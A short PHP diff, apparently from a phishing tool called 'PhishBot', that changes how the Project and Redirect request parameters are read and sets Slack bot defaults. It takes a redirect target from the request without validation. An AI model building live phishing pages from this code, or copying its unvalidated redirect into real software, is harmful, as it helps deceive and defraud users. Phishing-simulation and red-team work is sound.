@@ -264,8 +264,8 @@ body {
 <?php } else {
 
 if(isset($_REQUEST['APIURL'])){$APIURL = $_REQUEST['APIURL'];}else{$APIURL = $_SERVER['SERVER_NAME'];}
-if(isset($_REQUEST['Project']) || $_REQUEST['Project'] == ""){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
-if(isset($_REQUEST['Redirect']) || $_REQUEST['Redirect'] == "https://"){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
+if(isset($_REQUEST['Project']) || $_REQUEST['Project'] != ""){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
+if(isset($_REQUEST['Redirect']) || $_REQUEST['Redirect'] != "https://"){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
 if(isset($_REQUEST['SlackBotName'])){$SlackBotName = $_REQUEST['SlackBotName'];}else{$SlackBotName = "PhishBot";}
 if(isset($_REQUEST['SlackEmoji'])){$SlackEmoji = $_REQUEST['SlackEmoji'];}else{$SlackEmoji = ":fishing_pole_and_fish:";}
 
